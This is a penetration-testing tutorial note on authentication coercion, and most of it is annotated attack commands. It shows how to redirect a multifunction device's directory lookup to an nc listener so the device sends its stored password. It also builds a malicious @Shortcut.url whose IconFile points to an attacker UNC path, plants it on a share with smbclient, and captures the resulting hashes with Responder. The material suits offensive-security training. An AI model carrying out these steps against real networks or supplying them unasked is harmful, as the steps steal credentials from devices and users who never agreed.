# Authentication Coercion

Stop guessing credentials and make something send you one instead. A device holds a password so it can query the directory, a person walks past a folder with their session already open — in both cases the credential is in motion and you only have to be standing where it lands. This is the road in when every password you sprayed came back empty.

## Making a device hand over its stored directory password

Why the credential is there at all: a device that lets someone type a colleague's name on its panel and scan a document to them has to look that colleague up somewhere, and that somewhere is the domain's directory. So the device stores an account name and a password and uses them to sign in to the directory each time. The panel shows that account name in plain text and the password as a row of dots — but the dots are a display choice, and the stored value behind them is intact and unencrypted.

The attack redirects the lookup. You change the directory server address in the device's configuration to your own machine, press the button that tests the connection, and the device signs in to you, using the password it has held for years. Three things make it work, and all three are configuration rather than software flaws: the panel is often still on its factory password, the account is often far more privileged than a directory lookup needs, and the sign-in is often unencrypted because nobody turned encryption on.

```bash
nc -lvnp 3489
```

- `-l` → listen rather than connect.
- `-v` → verbose, and the one that is easy to omit. Without it a connection arrives, the credential arrives with it, and your terminal prints nothing to tell you a connection ever happened — so you press the test button again, and again, reading silence as failure.
- `-n` → never resolve addresses to names, so the connecting device is reported as an address and the listener does not pause on a name lookup.
- `-p 3489` → the port. It has to match what you typed into the device's configuration, and it has to be one you can bind: anything below 1024 needs root, and on a machine already running its own directory service the standard port 389 is taken, which is the usual reason for a high port here.

> [!important] The panel's password field and the device's memory are different things
> A masked field does not mean the value is gone, and a field you cannot read does not mean a field the device cannot send. You are not extracting the password from the browser — you are asking the device to use it, at an address you chose.

## Making a person hand over their hash

Why it fires without a click: a file browser draws icons for the files in a folder as soon as the folder is opened. A shortcut file is allowed to say where its icon lives, and that location may be on another machine — written as two backslashes, a host, and a path. So the moment the folder is drawn, the machine connects to that host to fetch a picture, and because the file-sharing protocol authenticates before it does anything else, it signs in first, on behalf of whoever is looking. That sign-in is what you are collecting.

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://domain.local
WorkingDirectory=share
IconFile=\\<your ip>\share\icon.ico
IconIndex=1
EOF
```

- the quotes around `'EOF'` → the one that is easy to omit, and omitting it destroys the attack silently. Unquoted, the shell processes what it reads and turns each pair of backslashes into one, so the icon path becomes a single-backslash string that is not a network path at all. The file is created, the upload succeeds, the folder gets opened, and nothing ever connects to you.
- `IconFile` → the only line that matters. The other three are there so the file is a well-formed shortcut; the address in `URL` is never fetched by anyone and can be anything.
- the leading `@` in the filename → sorts the file to the top of the folder listing, so it is among the first icons drawn rather than one that needs scrolling to. A file below the fold is a file whose icon is never requested.

```bash
smbclient //server.domain.local/share -U 'DOMAIN\user%Password123!'
```

- `//server/share` with forward slashes → this client's own spelling, even though the path inside the shortcut file uses backslashes. They are two different conventions in two different places and mixing them up is a five-minute mistake.
- `-U 'DOMAIN\user%password'` → domain, user, then the password after a percent sign. Quote the whole thing: the backslash, the percent and any symbol in the password are all shell characters, and an unquoted one hands the client something you did not type.
- once connected, `put @Shortcut.url` uploads it under the same name. Unlike the file transfer protocol's version of this command, one argument is correct here — this client reuses the local name rather than sending the whole local path as the remote name, which is the failure documented in [[21-FTP]].

## Catching what comes back

```bash
sudo responder -I tun0
```

- `-I tun0` → the interface to listen on, and the one that is easy to get wrong rather than easy to omit: the tool refuses to start without it, but naming your ordinary network interface instead of the tunnel you reached the target through means it listens where nothing will ever arrive, and it reports itself as running perfectly while doing so.
- `sudo` → the tool binds the file-sharing port and several others below 1024. Without it the start fails on a permission error that names a port, which reads as the port being taken rather than as your privileges.
- the port conflict that costs the most time: a machine already running its own file-sharing service occupies that port, so the tool cannot bind it, and the one thing you needed to catch is the one thing it cannot catch. Stop that service before starting the listener.

> [!warning] This tool answers questions it was not asked, by default
> Beyond listening, it replies to the local name-lookup broadcasts that Windows machines send when ordinary name resolution fails — claiming to be whatever host was asked for, so that traffic meant for a mistyped name comes to you instead. That is active interference with a production network, not passive collection, and on a real engagement it needs to be in scope in writing. Analysis mode listens and answers nothing when you want the safe version.
